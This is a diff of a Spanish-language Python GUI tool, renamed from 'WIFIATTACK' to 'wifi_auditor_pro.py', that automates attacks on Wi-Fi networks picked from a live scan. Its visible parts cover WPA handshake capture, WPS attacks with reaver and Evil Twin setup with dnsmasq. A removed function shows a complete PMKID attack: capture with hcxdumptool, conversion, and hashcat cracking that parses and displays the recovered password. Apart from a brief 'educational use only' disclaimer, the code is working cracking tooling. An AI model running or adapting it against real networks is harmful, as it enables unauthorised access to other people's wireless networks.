@@ -1,8 +1,8 @@
-#WIFIATTACK
-# wifi_auditor_gui.py
+# wifi_auditor_pro.py
 #
 # ADVERTENCIA: Este script es para fines educativos y debe ser utilizado
-# únicamente en redes para las que se tiene permiso explícito.
+# únicamente en redes para las que se tiene permiso explícito. El uso
+# no autorizado de estas herramientas es ilegal.
 
 import tkinter as tk
 from tkinter import ttk, scrolledtext, filedialog, messagebox
@@ -16,7 +16,7 @@ import re
 import csv
 from datetime import timedelta
 
-# --- Funciones de Backend (similares a la versión anterior pero adaptadas) ---
+# --- Dependencias requeridas para cada tipo de ataque ---
 # <--- NUEVO: Diccionario de dependencias para una fácil verificación
 REQUIRED_TOOLS = {
     "General": ["iw", "ifconfig", "iwconfig", "systemctl"],
@@ -26,13 +26,14 @@ REQUIRED_TOOLS = {
     "WPS": ["reaver"]
 }
 
+# --- Funciones de Backend (mejoradas y nuevas) ---
 
 def check_root():
-    """Verifica si el script se ejecuta como root y muestra un error si no."""
+    """Verifica si el script se ejecuta como root."""
     if os.geteuid() != 0:
         messagebox.showerror("Error de Privilegios", 
                              "Este script requiere privilegios de superusuario (root).\n"
-                             "Por favor, ejecútalo con 'sudo python3 wifi_auditor_gui.py'")
+                             "Por favor, ejecútalo con 'sudo python3 wifi_auditor_pro.py'")
         sys.exit(1)
 
 # <--- NUEVO: Función para verificar todas las herramientas necesarias
@@ -50,6 +51,7 @@ def check_dependencies():
                                "Por favor, instálalas para asegurar la funcionalidad completa:\n\n"
                                f"{', '.join(missing_tools)}")
     return not missing_tools
+
 
 def find_wireless_interface():
     """Encuentra la primera interfaz inalámbrica en modo managed."""
@@ -91,7 +93,7 @@ def set_monitor_mode(interface, log_queue):
         log_queue.put(f"[!] ERROR: No se pudo activar el modo monitor.")
         log_queue.put(f"    Error: {e.stderr.decode() if e.stderr else 'Revisa si tu tarjeta es compatible.'}")
         return None
-    
+
 def stop_monitor_mode(interface, log_queue):
     """Desactiva el modo monitor."""
     log_queue.put("[*] Desactivando modo monitor...")
@@ -146,36 +148,36 @@ def create_dnsmasq_conf(interface):
 class WifiAuditorGUI:
     def __init__(self, root):
         self.root = root
-        self.root.title("WIFIATTACK")
-        self.root.geometry("900x700")
+        self.root.title("Auditor Wi-Fi Pro (Fines Educativos)")
+        self.root.geometry("950x750")
 
-        self.interface = None
+        self.base_interface = None
+        self.monitor_interface = None
         self.attack_thread = None
         self.stop_event = threading.Event()
         self.log_queue = queue.Queue()
         self.attack_start_time = None
-        self.active_processes = []
+        self.active_processes = [] # <--- NUEVO: Lista para gestionar todos los subprocesos
 
         # --- Variables de estado ---
         self.attack_status = tk.StringVar(value="Inactivo")
         self.elapsed_time = tk.StringVar(value="00:00:00")
-        self.current_attack_type = tk.StringVar(value="WPA Handshake") # Default attack type
+        
+        # Comprobaciones iniciales
+        check_root()
+        check_dependencies()
+        self.base_interface = find_wireless_interface()
 
         # --- Creación de Widgets ---
         self.create_widgets()
         self.root.protocol("WM_DELETE_WINDOW", self.on_closing)
 
-        # Iniciar el chequeo de la cola de logs
         self.process_log_queue()
         
-        # Comprobaciones iniciales
-        check_root()
-        self.interface = find_wireless_interface()
-        if not self.interface:
+        if not self.base_interface:
              self.log_message("[!] ERROR: No se encontró ninguna interfaz de red inalámbrica compatible.")
         else:
-             self.log_message(f"[*] Interfaz inalámbrica encontrada: {self.interface}")
-
+             self.log_message(f"[*] Interfaz inalámbrica base encontrada: {self.base_interface}")
 
     def create_widgets(self):
         main_frame = ttk.Frame(self.root, padding="10")
@@ -288,7 +290,7 @@ class WifiAuditorGUI:
         log_frame.pack(fill=tk.BOTH, expand=True, pady=5)
         self.log_text = scrolledtext.ScrolledText(log_frame, wrap=tk.WORD, state="disabled", height=10, bg="black", fg="limegreen")
         self.log_text.pack(fill=tk.BOTH, expand=True)
-        
+
     def on_network_select(self, event):
         """Cuando el usuario selecciona una red, rellena los campos de todas las pestañas."""
         selected_item = self.tree.focus()
@@ -311,25 +313,21 @@ class WifiAuditorGUI:
             self.wps_bssid.set("") # Limpiar si la red no tiene WPS
 
     def log_message(self, message):
-        """Añade un mensaje a la caja de texto de logs de forma segura."""
         self.log_text.config(state="normal")
         self.log_text.insert(tk.END, message + "\n")
         self.log_text.config(state="disabled")
-        self.log_text.see(tk.END) # Auto-scroll
+        self.log_text.see(tk.END)
 
     def update_attack_status(self, status):
-        """Actualiza el estado del ataque en la GUI."""
         self.attack_status.set(status)
 
     def update_elapsed_time(self):
-        """Actualiza el tiempo transcurrido desde el inicio del ataque."""
         if self.attack_start_time and not self.stop_event.is_set():
             delta = timedelta(seconds=int(time.time() - self.attack_start_time))
             self.elapsed_time.set(str(delta))
-            self.root.after(1000, self.update_elapsed_time) # Actualizar cada segundo
+            self.root.after(1000, self.update_elapsed_time)
 
     def process_log_queue(self):
-        """Procesa mensajes de la cola y actualiza la GUI."""
         try:
             while True:
                 message = self.log_queue.get_nowait()
@@ -339,7 +337,6 @@ class WifiAuditorGUI:
         self.root.after(100, self.process_log_queue)
 
     def start_scan_thread(self):
-        """Inicia el escaneo de redes en un hilo separado para no congelar la GUI."""
         self.scan_button.config(state=tk.DISABLED)
         self.update_attack_status("Escaneando redes...")
         self.log_message("[*] Iniciando escaneo de redes durante 20 segundos...")
@@ -404,21 +401,10 @@ class WifiAuditorGUI:
             self.update_attack_status("Escaneo completado")
             stop_monitor_mode(mon_iface, self.log_queue)
 
-    def on_network_select(self, event):
-        """Cuando el usuario selecciona una red, rellena los campos de ataque."""
-        selected_item = self.tree.focus()
-        if selected_item:
-            item = self.tree.item(selected_item)
-            bssid, channel, _, _ = item['values']
-            self.target_bssid.set(bssid)
-            self.target_channel.set(channel)
-
-    def browse_wordlist(self):
-        """Abre un diálogo para seleccionar el archivo de diccionario."""
-        filepath = filedialog.askopenfilename(title="Selecciona un Diccionario",
-                                              filetypes=(("Archivos de Texto", "*.txt"), ("Todos los archivos", "*.*")))
+    def browse_wordlist(self, string_var):
+        filepath = filedialog.askopenfilename(title="Selecciona un Diccionario", filetypes=(("Archivos de Texto", "*.txt"), ("Todos los archivos", "*.*")))
         if filepath:
-            self.wordlist_path.set(filepath)
+            string_var.set(filepath)
 
     def start_attack(self, attack_type):
         # Validaciones
@@ -469,7 +455,6 @@ class WifiAuditorGUI:
                 pass # El proceso ya terminó
         self.active_processes.clear()
 
-    #NUEVO: Funciones para crear archivos de configuración para Evil Twin
     def attack_finished(self):
         """Reactiva los botones y resetea el estado cuando el ataque termina."""
         self.stop_button.config(state=tk.DISABLED)
@@ -487,16 +472,10 @@ class WifiAuditorGUI:
         if self.monitor_interface:
             stop_monitor_mode(self.monitor_interface, self.log_queue)
         self.root.destroy()
+        
+    # --- SECUENCIAS DE ATAQUE ---
 
-    def check_tool_exists(self, tool_name):
-        """Verifica si una herramienta específica existe en el PATH."""
-        return subprocess.run(['which', tool_name], capture_output=True).returncode == 0
-
-    def run_handshake_attack_sequence(self, bssid, channel, wordlist):
-        """
-        Esta es la función principal que se ejecuta en el hilo separado para ataque WPA Handshake.
-        Orquesta toda la secuencia de ataque.
-        """
+    def run_handshake_attack_sequence(self):
         bssid = self.hs_bssid.get()
         channel = self.hs_channel.get()
         wordlist = self.hs_wordlist.get()
@@ -556,142 +535,6 @@ class WifiAuditorGUI:
             stop_monitor_mode(self.monitor_interface, self.log_queue)
             self.attack_finished()
             self.monitor_interface = None
-
-    def run_pmkid_attack_sequence(self, bssid, channel, wordlist):
-        """
-        Función para el ataque PMKID utilizando hcxdumptool y hashcat.
-        """
-        self.update_attack_status("Activando modo monitor (PMKID)...")
-        if not set_monitor_mode(self.interface, self.log_queue):
-            self.attack_finished()
-            return
-
-        pmkid_file_cap = "pmkid_capture.pcap"
-        pmkid_file_hash = "pmkid_hash.hc22000" # Hashcat mode 22000 for WPA-EAPOL-PMKID
-
-        # Clean up previous files
-        for f in [pmkid_file_cap, pmkid_file_hash]:
-            if os.path.exists(f):
-                os.remove(f)
-
-        hcxdumptool_proc = None
-        try:
-            self.log_queue.put("\n--- FASE 1: Capturando PMKID ---")
-            self.log_queue.put(f"[*] Escuchando PMKID de {bssid} en el canal {channel}...")
-            self.update_attack_status("Buscando PMKID...")
-
-            # Command to capture PMKID
-            # -i interface, -o output.pcapng, --enable_status=1 to show live status (optional)
-            # -b bssid (optional, for specific target)
-            hcxdumptool_cmd = ['hcxdumptool', '-i', self.interface, '-o', pmkid_file_cap, '--enable_status=1']
-            if bssid:
-                hcxdumptool_cmd.extend(['--filterlist_ap', bssid, '--filterlist_ap_mode', '2']) # Mode 2: only specified APs
-            
-            # Use subprocess.Popen for non-blocking execution
-            hcxdumptool_proc = subprocess.Popen(hcxdumptool_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-
-            pmkid_found = False
-            start_time = time.time()
-            timeout = 60 # Try to capture for 60 seconds
-
-            while not pmkid_found and not self.stop_event.is_set() and (time.time() - start_time < timeout):
-                line = hcxdumptool_proc.stdout.readline()
-                if not line:
-                    break
-                self.log_queue.put(line.strip())
-                if "PMKID(s) written" in line or "AP-PMKID" in line: # hcxdumptool output might vary
-                    self.log_queue.put("\n[+] ¡PMKID CAPTURADO (potencialmente)! Convirtiendo a formato Hashcat...")
-                    pmkid_found = True
-                time.sleep(0.1)
-            
-            if not pmkid_found:
-                self.log_queue.put("[!] No se capturó PMKID en el tiempo de espera.")
-                self.update_attack_status("Fallo al capturar PMKID")
-                return
-
-        finally:
-            if hcxdumptool_proc:
-                hcxdumptool_proc.terminate()
-                hcxdumptool_proc.wait(timeout=5)
-
-        # Convert .pcap to hashcat format
-        if os.path.exists(pmkid_file_cap) and not self.stop_event.is_set():
-            self.log_queue.put(f"[*] Convirtiendo '{pmkid_file_cap}' a formato hashcat...")
-            try:
-                subprocess.run(['hcxhashtool', '-o', pmkid_file_hash, '-i', pmkid_file_cap], check=True, capture_output=True, text=True)
-                self.log_queue.put(f"[+] Archivo de hash guardado como '{pmkid_file_hash}'.")
-                self.update_attack_status("PMKID capturado. Crackeando...")
-            except subprocess.CalledProcessError as e:
-                self.log_queue.put(f"[!] ERROR al convertir PMKID: {e.stderr}")
-                self.update_attack_status("Error de conversión PMKID")
-                stop_monitor_mode(self.interface, self.log_queue)
-                self.attack_finished()
-                return
-            except FileNotFoundError:
-                self.log_queue.put("[!] ERROR: 'hcxhashtool' no encontrado. Asegúrate de que está instalado.")
-                self.update_attack_status("Error de herramienta")
-                stop_monitor_mode(self.interface, self.log_queue)
-                self.attack_finished()
-                return
-        else:
-            self.log_queue.put("[!] Archivo .pcap de PMKID no encontrado o ataque detenido.")
-            stop_monitor_mode(self.interface, self.log_queue)
-            self.attack_finished()
-            return
-
-        # Start cracking with hashcat
-        if os.path.exists(pmkid_file_hash) and not self.stop_event.is_set():
-            self.log_queue.put("\n--- FASE 2: Crackeando PMKID con Hashcat ---")
-            self.log_queue.put(f"[*] Iniciando ataque de diccionario con '{wordlist}' en hashcat (modo 22000)...")
-            self.update_attack_status("Crackeando PMKID...")
-
-            # Hashcat command: -m 22000 for WPA-EAPOL-PMKID, -a 0 for straight attack, -w wordlist, hashfile
-            hashcat_cmd = ['hashcat', '-m', '22000', '-a', '0', '-w', '3', pmkid_file_hash, wordlist] # -w 3 for high performance
-            
-            try:
-                # Use Popen to allow stopping
-                hashcat_proc = subprocess.Popen(hashcat_cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-                
-                found_key = None
-                while not self.stop_event.is_set():
-                    line = hashcat_proc.stdout.readline()
-                    if not line:
-                        break
-                    self.log_queue.put(line.strip())
-                    if "Cracked" in line or "HASH:PASS" in line: # Look for hashcat output indicating a crack
-                        # Attempt to parse the cracked password from the line
-                        match = re.search(r'[^:]*:(.*)', line) # Capture anything after the last colon
-                        if match:
-                            found_key = match.group(1).strip()
-                            if found_key: # Ensure it's not empty
-                                self.log_queue.put("==========================================")
-                                self.log_queue.put(f"    ¡ÉXITO! Contraseña encontrada: {found_key}")
-                                self.log_queue.put("==========================================")
-                                self.update_attack_status(f"ÉXITO: {found_key}")
-                                break # Stop reading output once found
-                
-                hashcat_proc.terminate()
-                hashcat_proc.wait(timeout=5)
-
-                if not found_key:
-                    self.log_queue.put("[!] Contraseña no encontrada en el diccionario (Hashcat).")
-                    self.update_attack_status("Contraseña no encontrada")
-
-            except FileNotFoundError:
-                self.log_queue.put("[!] ERROR: 'hashcat' no encontrado. Asegúrate de que está instalado.")
-                self.update_attack_status("Error de herramienta")
-            except Exception as e:
-                self.log_queue.put(f"[!] Error durante el ataque con Hashcat: {e}")
-                self.update_attack_status("Error de Hashcat")
-        elif self.stop_event.is_set():
-            self.log_queue.put("[*] El ataque PMKID fue detenido por el usuario.")
-            self.update_attack_status("Ataque detenido")
-        else:
-            self.log_queue.put("[!] Archivo de hash PMKID no encontrado.")
-            self.update_attack_status("Fallo de PMKID")
-
-        stop_monitor_mode(self.interface, self.log_queue)
-        self.attack_finished()
 
     # <--- NUEVO: Secuencia de ataque PMKID completa
     def run_pmkid_attack_sequence(self):
